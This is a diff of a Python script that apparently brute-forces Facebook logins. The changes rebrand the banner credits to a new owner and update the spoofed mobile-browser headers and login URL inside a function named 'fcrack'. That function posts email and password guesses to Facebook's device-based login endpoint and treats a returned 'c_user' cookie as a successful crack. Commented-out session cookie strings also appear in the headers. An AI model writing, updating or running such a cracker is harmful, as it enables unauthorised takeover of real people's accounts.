@@ -158,11 +158,11 @@ logo=("""\033[1;97m
 |  |  |  |  /  _____  \ |  `--'  | |  | 
 |__|  |__| /__/     \__\ \______/  |__| 
  \33[1;37m----------------------------------------------
-      →   Owner         :  HAJI
-      →   Facebook   : ĸΑМЯΑИ
-      →   Github         : ĸAМRAN
-      →   Tool Type   : ғree
-      →   Version       :  1.2
+      →   Owner         : NAJEEB
+      →   Facebook      : NAJEEB
+      →   Github        : NAJEEB
+      →   Tool Type     : ғree
+      →   Version       : 1.3
 \x1b[1;97m
 \33[1;37m----------------------------------------------""")
 def linex():
@@ -825,24 +825,28 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			headers = {'authority': 'mbasic.facebook.com',
-    'method': 'GET',
-	'path':'/',
-	'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=gPe4Y2Fr8LcnnVdhc_xyNT9R; sb=gPe4Y8b8Oeec8DcdsNblj6Ji; m_pixel_ratio=2; wd=360x664; fr=0Ghe4yd0RnZBr7Ngw..BjuPeA.vW.AAA.0.0.BjuPes.AWUd_hbjy2w',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13',}
-			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			headers = {
+                       'authority': 'm.facebook.com',
+                       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                       'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                       'cache-control': 'max-age=0',
+                     # 'cookie': 'datr=psndZbvL-EOMUNliMRhU-diD; sb=psndZe2M2sdVA-RoCnMAig4k; m_pixel_ratio=1.891728162765503; wd=572x1159; fr=0n7d7uLTiCD8497nl..Bl3cmm..AAA.0.0.Bl3cnU.AWW9KhUBzmc',
+                       'dpr': '2.2250001430511475',
+                       'sec-ch-prefers-color-scheme': 'dark',
+                       'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+                       'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+                       'sec-ch-ua-mobile': '?1',
+                       'sec-ch-ua-model': '"SOV43"',
+                       'sec-ch-ua-platform': '"Android"',
+                       'sec-ch-ua-platform-version': '"12.0.0"',
+                       'sec-fetch-dest': 'document',
+                       'sec-fetch-mode': 'navigate',
+                       'sec-fetch-site': 'none',
+                       'sec-fetch-user': '?1',
+                       'upgrade-insecure-requests': '1',
+                       'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+                       'viewport-width': '980',}
+			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
